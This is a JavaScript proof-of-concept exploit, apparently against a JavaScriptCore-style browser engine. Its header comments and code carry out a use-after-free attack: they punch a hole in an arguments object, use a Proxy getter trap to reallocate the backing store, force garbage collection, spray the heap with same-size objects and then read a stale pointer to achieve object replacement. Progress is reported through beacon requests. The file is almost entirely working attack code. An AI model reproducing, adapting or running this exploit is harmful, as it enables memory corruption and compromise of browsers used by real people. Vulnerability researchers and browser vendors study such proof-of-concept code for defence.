// p270 — Old butterfly contents untraced: victim object freed via UAF
//
// Key finding: conservative scanner pins old butterfly ALIVE but does NOT
// trace the JSValues stored inside it. Objects referenced ONLY from the
// old butterfly's untraced contents get collected by GC.
//
// Attack:
// 1. ClonedArguments with hole at slot 0, victim at slot 1
// 2. Proxy trap fires at slot 0 → grow butterfly (new alloc, old stale)
// 3. Overwrite slot 1 in NEW butterfly → victim has no traced references
// 4. Force GC → victim collected (only in untraced old butterfly)
// 5. Spray same size class → reclaim victim's cell
// 6. copyToArguments reads old butterfly slot 1 → stale pointer → spray object
//
// If result[1].tag === 'SPRAY' → UAF confirmed, object replacement achieved
//
// Beacon prefix: V270-

(function() {
  function B(tag, body) {
    try {
      var url = '/beacon/V270-' + tag + '?t=' + Date.now();
      if (body) { navigator.sendBeacon(url, String(body).substring(0, 800)); }
      else { new Image().src = url; }
    } catch(e) {}
  }

  B('BOOT');

  function target() { return arguments; }

  var NARGS = 32;

  function runTest(testName, gcPressure, sprayCount) {
    var victim = {tag: 'VICTIM', id: 0xDEAD};
    var victimWR = new WeakRef(victim);

    var argList = [0]; // slot 0 = will be hole
    argList.push(victim); // slot 1 = victim
    for (var i = 2; i < NARGS; i++) argList.push(i);

    var args = target.apply(null, argList);
    victim = null;
    argList = null;

    delete args[0]; // create hole at slot 0

    var sprayObjs = [];
    var trapFired = false;

    Object.setPrototypeOf(args, new Proxy({}, {
      get: function(t, prop) {
        if (prop !== '0' || trapFired) return undefined;
        trapFired = true;
        B(testName + '-TRAP');

        // Step 1: Grow butterfly → new allocation, old orphaned
        for (var j = 100; j < 500; j++) args[j] = 0x41;
        B(testName + '-GREW');

        // Step 2: Overwrite victim in NEW butterfly
        args[1] = null;
        B(testName + '-CLEARED');

        // Step 3: Force GC to free victim
        for (var round = 0; round < gcPressure; round++) {
          var junk = [];
          for (var k = 0; k < 10000; k++) {
            junk.push({x: k, y: String(k)});
          }
          junk = null;
        }
        B(testName + '-GC-' + gcPressure + 'x10K');

        // Step 4: Check WeakRef
        var alive = victimWR.deref() !== undefined;
        B(testName + '-WR-' + (alive ? 'ALIVE' : 'FREED'));

        // Step 5: Spray objects matching victim's size class
        for (var s = 0; s < sprayCount; s++) {
          sprayObjs.push({tag: 'SPRAY', id: s});
        }
        B(testName + '-SPRAY-' + sprayObjs.length);

        return 0xFACE; // return value for slot 0
      }
    }));

    B(testName + '-ARMED');

    // Trigger copyToArguments via apply
    var result;
    try {
      result = (function() {
        return Array.prototype.slice.call(arguments);
      }).apply(null, args);
    } catch(e) {
      B(testName + '-ERR-' + e.message.substring(0, 40));
      return;
    }

    if (!result) { B(testName + '-NO-RESULT'); return; }
    B(testName + '-RESULT-LEN-' + result.length);

    // Check slot 0 (should be trap return value 0xFACE)
    B(testName + '-S0-' + typeof result[0] + '-' + String(result[0]));

    // Check slot 1 — THE KEY TEST
    var s1 = result[1];
    B(testName + '-S1-TYPE-' + typeof s1);

    if (typeof s1 === 'object' && s1 !== null) {
      try {
        var tag = s1.tag;
        var id = s1.id;
        B(testName + '-S1-TAG-' + String(tag));
        B(testName + '-S1-ID-' + String(id));

        if (tag === 'SPRAY') {
          B(testName + '-UAF-CONFIRMED-ID-' + id);

          // Check identity with spray array
          var matchIdx = -1;
          for (var m = 0; m < sprayObjs.length; m++) {
            if (s1 === sprayObjs[m]) { matchIdx = m; break; }
          }
          B(testName + '-MATCH-IDX-' + matchIdx);

          // Read raw bits via structured clone or DataView trick
          try {
            var buf = new ArrayBuffer(8);
            var f64 = new Float64Array(buf);
            var dv = new DataView(buf);
            // Store the object ref as an array element in ContiguousDouble
            // This won't work directly, but try getting address info
            B(testName + '-SPRAY-OBJ-PROPS-' + Object.keys(s1).join(','));
          } catch(e2) {}
        } else if (tag === 'VICTIM') {
          B(testName + '-STILL-VICTIM');
        } else {
          B(testName + '-UNEXPECTED-TAG-' + String(tag).substring(0, 20));
        }
      } catch(e) {
        B(testName + '-S1-ERR-' + e.message.substring(0, 30));
      }
    } else if (s1 === null) {
      B(testName + '-S1-NULL');
    } else if (s1 === undefined) {
      B(testName + '-S1-UNDEF');
    } else {
      B(testName + '-S1-PRIM-' + typeof s1 + '-' + String(s1).substring(0, 20));
    }

    // Check slot 2 (should be original value 2)
    B(testName + '-S2-' + typeof result[2] + '-' + String(result[2]));

    // Final WeakRef check
    var finalAlive = victimWR.deref() !== undefined;
    B(testName + '-FINAL-WR-' + (finalAlive ? 'ALIVE' : 'FREED'));

    return {tag: s1 && s1.tag, alive: finalAlive};
  }

  // Test A: Moderate GC (50 rounds × 10K = 500K objects)
  try {
    var rA = runTest('A', 50, 10000);
    B('A-SUMMARY-TAG-' + (rA ? rA.tag : 'null') + '-WR-' + (rA ? rA.alive : 'null'));
  } catch(e) {
    B('A-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // Test B: Heavy GC (200 rounds × 10K = 2M objects)
  try {
    var rB = runTest('B', 200, 20000);
    B('B-SUMMARY-TAG-' + (rB ? rB.tag : 'null') + '-WR-' + (rB ? rB.alive : 'null'));
  } catch(e) {
    B('B-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // Test C: Multiple victims at different slots, verify stale reads
  try {
    B('C-START');
    var victims = [];
    var weakRefs = [];
    for (var v = 0; v < 5; v++) {
      victims.push({tag: 'VICTIM', id: v, slot: v + 1});
      weakRefs.push(new WeakRef(victims[v]));
    }

    // Holes at 0, 6, 12 — victims at 1-5
    var cArgs = [0]; // hole
    for (var v = 0; v < 5; v++) cArgs.push(victims[v]);
    for (var i = 6; i < NARGS; i++) cArgs.push(i);

    var args3 = target.apply(null, cArgs);
    victims = null;
    cArgs = null;

    delete args3[0];

    var cTrap = false;
    var cSpray = [];

    Object.setPrototypeOf(args3, new Proxy({}, {
      get: function(t, prop) {
        if (prop !== '0' || cTrap) return undefined;
        cTrap = true;
        B('C-TRAP');

        // Grow
        for (var j = 100; j < 500; j++) args3[j] = 0x41;

        // Clear all victim slots in NEW butterfly
        for (var v = 1; v <= 5; v++) args3[v] = null;
        B('C-CLEARED-5');

        // Heavy GC
        for (var r = 0; r < 100; r++) {
          var junk = [];
          for (var k = 0; k < 10000; k++) junk.push({x: k});
          junk = null;
        }
        B('C-GC-1M');

        // Check WeakRefs
        var freed = 0;
        for (var w = 0; w < 5; w++) {
          if (weakRefs[w].deref() === undefined) freed++;
        }
        B('C-FREED-' + freed + '-OF-5');

        // Spray
        for (var s = 0; s < 15000; s++) {
          cSpray.push({tag: 'SPRAY', id: s, slot: -1});
        }
        B('C-SPRAY-' + cSpray.length);

        return 0xFACE;
      }
    }));

    var result3;
    try {
      result3 = (function() {
        return Array.prototype.slice.call(arguments);
      }).apply(null, args3);
    } catch(e) {
      B('C-ERR-' + e.message.substring(0, 40));
    }

    if (result3) {
      B('C-RESULT-LEN-' + result3.length);
      var sprayHits = 0;
      var victimHits = 0;
      var otherHits = 0;
      for (var i = 1; i <= 5; i++) {
        var val = result3[i];
        if (typeof val === 'object' && val !== null) {
          try {
            if (val.tag === 'SPRAY') {
              sprayHits++;
              B('C-HIT-SLOT' + i + '-SPRAY-ID-' + val.id);
            } else if (val.tag === 'VICTIM') {
              victimHits++;
            } else {
              otherHits++;
              B('C-SLOT' + i + '-TAG-' + String(val.tag).substring(0, 15));
            }
          } catch(e) {
            otherHits++;
            B('C-SLOT' + i + '-ERR-' + e.message.substring(0, 20));
          }
        } else if (val === null) {
          B('C-SLOT' + i + '-NULL');
        } else {
          otherHits++;
          B('C-SLOT' + i + '-' + typeof val + '-' + String(val).substring(0, 15));
        }
      }
      B('C-SUMMARY-SPRAY-' + sprayHits + '-VICTIM-' + victimHits + '-OTHER-' + otherHits);
    }
  } catch(e) {
    B('C-OUTER-ERR-' + e.message.substring(0, 40));
  }

  B('DONE');
})();
